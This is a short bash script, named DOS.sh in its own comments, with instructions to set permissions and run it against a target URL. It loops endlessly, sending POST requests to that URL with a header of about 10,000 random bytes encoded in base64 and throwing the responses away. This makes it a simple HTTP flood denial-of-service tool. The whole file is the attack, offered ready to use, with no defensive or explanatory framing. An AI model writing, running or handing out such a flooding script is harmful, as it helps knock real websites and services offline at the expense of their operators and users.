#! /bin/bash

#save file as DOS.sh 
# provide 755 permissions
# execute bash DOS.sh <url> 

while true; do
  curl -X POST $1 \
       -H "X-Flood: $(head -c 10000 /dev/urandom | base64)" \
       -s -o /dev/null
done
